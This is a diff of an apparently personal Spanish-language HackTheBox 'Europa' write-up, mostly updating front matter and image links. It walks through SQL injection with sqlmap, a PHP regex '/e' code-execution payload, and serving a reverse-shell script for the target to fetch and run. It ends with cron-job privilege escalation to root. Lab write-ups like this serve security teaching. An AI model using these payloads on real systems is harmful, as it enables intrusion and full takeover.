@@ -1,5 +1,15 @@
-# Europa
+---
+title: HackTheBox - Europa
+author: Watskip
+date: 2020-10-26 19:55:00 -0400
+categories: [Nix]
+tags: [SQLi, Regex, Misconfiguration]
+pin: false
+---
 
+![europa](https://user-images.githubusercontent.com/25357279/97245246-01290000-17d1-11eb-9732-c56d6776c61d.png)
+
+Europa nos muestra un bypass simple de un login, abusamos un pattern de regex en php para obtener RCE y luego empleamos un cronjob para escalar nuestros privilegios.
 Nuestro escaneo inicial nos muestra 3 puertos: 22, 80, 443.
 
 ```jsx
@@ -82,7 +92,7 @@ El resultado nos muestra 2 entradas interesantes `www.europacorp.htb` y `admin-p
 
 Cuando intentamos acceder a estos hosts mediante el puerto 80 nos tocamos con la página por defecto de apache. Entonces intentamos acceder al puerto 443 y nos encontramos con un login al momento de acceder el subdominio de `admin-portal`
 
-![Europa%20d794c8c2e323416cb3555479d3f5840c/Untitled.png](Europa%20d794c8c2e323416cb3555479d3f5840c/Untitled.png)
+![login](https://user-images.githubusercontent.com/25357279/97241900-cb801900-17c8-11eb-951b-d88bdceffe8b.png)
 
 ## Obteniendo RCE
 
@@ -95,20 +105,19 @@ sqlmap -u [https://admin-portal.europacorp.htb/login.php](https://admin-portal.e
 ```
 
 Luego de correr sqlmap para asistirnos en la inyección obtenemos la siguiente información de la base de datos.
-
-![Europa%20d794c8c2e323416cb3555479d3f5840c/Untitled%201.png](Europa%20d794c8c2e323416cb3555479d3f5840c/Untitled%201.png)
+![creds](https://user-images.githubusercontent.com/25357279/97245113-b3ac9300-17d0-11eb-835d-8147f9e55609.png)
 
 Una vez obtenemos los hashes observamos que son idénticos y que contienen 32 caracteres de longitud. Procedemos a verificarlos en [hashes.com](http://hashes.com) para confirmar si obtenemos su resultado en texto plano. Y obtenemos un resultado válido.
 
-![Europa%20d794c8c2e323416cb3555479d3f5840c/Untitled%202.png](Europa%20d794c8c2e323416cb3555479d3f5840c/Untitled%202.png)
+![hashes](https://user-images.githubusercontent.com/25357279/97241946-eb174180-17c8-11eb-9340-9f4e3f4f8e47.png)
 
 Estas credenciales quizá nos sirvan para ser usadas una vez tengamos ejecución de comandos de manera arbitratia en la máquina, pero por ahora procedemos a examinar el site.
 
-![Europa%20d794c8c2e323416cb3555479d3f5840c/Untitled%203.png](Europa%20d794c8c2e323416cb3555479d3f5840c/Untitled%203.png)
+![dashboard](https://user-images.githubusercontent.com/25357279/97245023-7a742300-17d0-11eb-9245-5730f5040fb4.png)
 
 Si vamos a la opción de Tools nos encontramos con un generador de configuraciones de OpenVPN
 
-![Europa%20d794c8c2e323416cb3555479d3f5840c/Untitled%204.png](Europa%20d794c8c2e323416cb3555479d3f5840c/Untitled%204.png)
+![Burp](https://user-images.githubusercontent.com/25357279/97245319-2cabea80-17d1-11eb-8976-c52915951447.png)
 
 En primera instancia pensé en obtener una reverse shell abusando la funcionalidad de OpenVPN mediante el parámetro up. Debajo está un artículo explicando cómo esto puede ser ejecutado.
 
@@ -118,7 +127,7 @@ Pero no funcionó con el propósito que esperaba.
 
 Luego de esto empecé a examinar los requests que se mandaban al site y a analizar la funcionalidad del generador. Vemos que remplaza lo que sea que le pasemos como parametro de IP dentro de la configuración y revisando uno de los requests que se han capturado vemos el parametro "pattern". 
 
-Luego de googlear (literalmente) "php pattern exploit", encontramos este site [http://www.madirish.net/402](http://www.madirish.net/402) que nos brinda la idea de usar  `/^(.*)/e` como pattern y  luego pasarle el string de `"system('CMD')"` . En este caso colocamos nuestro payload en el archivo `[reverse.sh](http://reverse.sh)` y lo servimos mediante el módulo de http.server en python `python3 -m http.server 80`
+Luego de googlear (literalmente) "php pattern exploit", encontramos [este site](http://www.madirish.net/402) que nos brinda la idea de usar  `/^(.*)/e` como pattern y  luego pasarle el string de `"system('CMD')"` . En este caso colocamos nuestro payload en el archivo `[reverse.sh](http://reverse.sh)` y lo servimos mediante el módulo de http.server en python `python3 -m http.server 80`
 
 ```bash
 $ cat reverse.sh 
@@ -127,7 +136,8 @@ $ cat reverse.sh
 
 Interceptamos el request y añadimos nuestro payload para obtener el script `[reverse.sh](http://reverse.sh)` y ejecutarlo, recordando darle codificación de URL
 
-![Europa%20d794c8c2e323416cb3555479d3f5840c/Untitled%205.png](Europa%20d794c8c2e323416cb3555479d3f5840c/Untitled%205.png)
+![Burp](https://user-images.githubusercontent.com/25357279/97244667-ae9b1400-17cf-11eb-9fc3-bf2837fe02ed.png)
+
 
 Revisamos nuestro listener y confirmamos que tenemos una reverse shell!
 
@@ -138,7 +148,7 @@ ya que la hemos capturado con `rlwrap`. A pesar de que somos www-data podemos le
 
 Examinando los directorios del usuario www-data encontramos uno particular que nos llama la atención y a su vez un archivo muy particular.
 
-![Europa%20d794c8c2e323416cb3555479d3f5840c/Untitled%206.png](Europa%20d794c8c2e323416cb3555479d3f5840c/Untitled%206.png)
+![clearlogs](https://user-images.githubusercontent.com/25357279/97244665-aba02380-17cf-11eb-89f6-2d6c428ae82c.png)
 
 Aquí vemos el contenido del archivo `clearlogs`
 
@@ -162,6 +172,6 @@ $ mv reverse.sh logcleared.sh
 
 Luego de unos minutos, revisamos nuestro listener y....
 
-![Europa%20d794c8c2e323416cb3555479d3f5840c/Untitled%207.png](Europa%20d794c8c2e323416cb3555479d3f5840c/Untitled%207.png)
+![pwned](https://user-images.githubusercontent.com/25357279/97244641-9c20da80-17cf-11eb-8138-af7366338852.png)
 
 Somos root!
